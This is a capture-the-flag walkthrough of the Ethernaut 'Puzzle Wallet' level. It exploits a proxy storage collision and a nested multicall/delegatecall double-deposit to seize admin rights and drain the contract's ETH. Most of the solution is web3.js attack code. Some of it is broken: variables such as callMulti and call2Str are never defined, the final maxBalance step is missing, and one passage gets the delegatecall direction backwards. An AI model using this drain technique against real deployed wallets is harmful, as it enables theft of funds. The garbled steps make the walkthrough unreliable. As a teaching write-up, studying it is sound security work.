# Ethernaut Level 25 (Puzzle Wallet) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 25. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

In a proxy setting, the storage used is of the proxy contract, while the logicÂ  is of the logic contract. Delegate call is made from the proxy to the logic, which changes the storage of the proxy contract.

In this setting, it must be ensured that the proxy mirrors the logic contract's storage variables, otherwise there will be storage clashes. E.g., first variable in proxy is owner address, and first variable in logic is total balance. The value stored in the first variable will be the address.

In this case, the PuzzleProxy contract address is the user-facing address (i.e., the address for the implementation contract). It will change storage inside PuzzleWallet, since delegate call is made from the wallet to the proxy.

#### Solution

A huge mistake has been made in this proxy implementation. When using a Proxy contract, the variables of the implementation and proxy must mirror each other, otherwise there will be storage collision. For example, the first variable in Proxy and Implementation must be owner, admin; if its owner, balance, the balance variable will contain admin and not balance. We will exploit this mistake first.

Since the implementation's ABI will not show the proxy's functions, we have to construct a function call to the proxy's `proposeNewAdmin()` with the player address.

```
let callStr = web3.eth.abi.encodeFunctionCall({
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_newAdmin'
    }]
}, [player]);
```

We send this data string as data in a transaction to the contract.

`await web3.eth.sendTransaction({from: player, to: contract.address, data: callStr})`

Now we have the player's address in the first storage slot of the proxy contract storage, `pendingAdmin` (which is the storage for the implementation contract).
For the implementation, it is wrongly called `owner` and thus the player is `owner` in the eyes of the proxy.

Being the owner, we can now whitelist ourselves.

`await contract.addToWhitelist(player)`

The goal for us now is to store our address `player` in the second storage slot (storage\[1\]), since this is where the `admin` variable is, and which is mirrored by the `maxBalance` variable in the implementation. Thus, the second part of our hack begins.

First, we whitelist the contract. We can do this since we became the owner earlier in part 1 of the hack:

`await contract.addToWhitelist(contract.address)`

Then, we have the contract send all its ETH (0.01 ETH) to the player (or any other address). This is because the `setMaxBalance()` function requires the ETH balance of the contract to be 0 in. We need to use this function to set the maxBalance to the player address. Once again, this is because `maxBalance` is actually the `admin` variable since proxy storage is used. Now, how do we make contract balance 0?

For this, **we want to ensure that the player's contract balance and the contract's ETH balance are the same** Why? because the function which we will use to drain the contract's balance, `execute` check's the sender's contract balance is equal to the ETH value being transferred from the contract. Since we want to transfer all of ETH from the contract, we must have an internal contract balance equal to the amount the contract has.

Let's take a crack at this.

Set 0.001 ETH as the contract's internal balance (by calling deposit with a value of 0.001 ETH)

```
let callStr = web3.eth.abi.encodeFunctionCall({
    name: 'deposit',
    type: 'function',
    inputs: [],
    payable: true,
    value: web3.utils.toWei("0.001", "ether")
}, []);
```

Then we convert the data hex string to a bytes value:

`callBytes = web3.utils.hexToBytes(callStr)`

And we call multicall, sending along 0.001 ETH

`await web3.eth.sendTransaction({from: player, to: contract.address, data: callMulti, value: '1000000000000000'})`

This increased players internal balance by 0.001 ETH and the contract's ETH balance by 0.001 ETH as well. Showing that deposit() received the 0.001 ETH so contract ETH bal increased. But it was the user's 0.001 ETH, not the contract's. Put simply, this transaction was just as if the player was depositing ETH.

This points to the fact that since a delegate call is made to deposit inside multicall, even though deposit is an external function, msg.sender is the user for it. Had there been a `.call` inside `multicall` instead of the `.delegatecall`, this would have done the trick since then the msg.sender for `deposit` would have been the contract itself.

Problem: If we try to increase our contract bal (i.e., balances\[msg.sender\]), the contract's balance also increases. This is because `deposit` increases the internal balance by the amount of msg.value sent in the call. This means that the contract balance will also increase since `deposit` is a payable function.

**How do deposit in such a way that the user's balance increases twice, while the contract's balance increases only once?**

Now: User contract bal: 0 , contract ETH bal: 0.001
Then: User contract bal: 0.002, contract ETH bal: 0.002

**We want to ensure that the player's contract balance and the contract's ETH balance are the same**

The way to circumvent this is to make two call inside `multicall(data1, data2)` with a value of `0.001`. Data1 will be a simple call to deposit:

```
let callStr = web3.eth.abi.encodeFunctionCall({
    name: 'deposit',
    type: 'function',
    inputs: [],
}, []);
```

In bytes

`data1Bytes = web3.utils.hexToBytes(callStr)`

So, while executing the delegatecall to data1, multicall will simply call deposit with a value of 0.001. Due to delegate call to deposit, the msg.sender will be the user and so the user's contract balance will increase by 0.001 to 0.001, and the contract's ETH balance will also increase by 0.001 to 0.002.

Data2 will call multicall(\[data1\]). So in this call, multicall will delegatecall itself, calling deposit. like: `multicall(multicall(deposit))` with a value of 0.001 ETH.

```
let data2 = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{
        type: 'bytes[]',
        name: 'data'
    }],
}, [[data1]]);
```

In bytes,

`data2Bytes = web3.utils.hexToBytes(call2Str)`

The call to multicall with both above datas

```
let callMulticall = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{
        type: 'bytes[]',
        name: 'data'
    }],
}, [[data1Bytes, data2Bytes]]);
```

Making the call

```
await web3.eth.sendTransaction({from: player, to: contract.address, data: callMulticall, value: '1000000000000000'})
```

**Multicall Execution**

data1: Multicall first calls deposit with 0.001 ETH, user contract bal inc by 0.001, contract bal also inc by 0.001 to 0.002 ETH. Deposit flag becomes true so cant call deposit again via multicall.

data2:Multiclall then delegatecalls itself calling deposit. This way, the selector is multicall's so the flag is bypassed and deposit is called with a value of 0.001 ETH. The caller is again msg.sender, the player, so our internal balance increases by 0.001 to 0.002. However, we only sent 0.001 ETH with was already transfered to the contract in the data1 call. As a resuly, contract balance stays the same (i.e., 0.002).

Finally, we now want to empty the contract's ETH balance. For this, we will use execute. Execute checks is msg.sender has enough internal balance, but makes the actual transfer from the ETH balance of the contract equivalent to the value provided.

`await contract.execute(player, toWei('0.002'), '0x');`

Now, we can set the `maxBalance` to the `player` address

`Number(fromWei(await web3.eth.getBalance(contract.address)))`

Congratulations; we won, son.

Now, what really cracked this last part?

Calling deposit twice in the same transaction. This way, we called deposit twice, but only one msg.value. So, while player balance increased twice, the contract balance increased only once. This made the balances equal and we were able to siphon out the funds via `execute`.
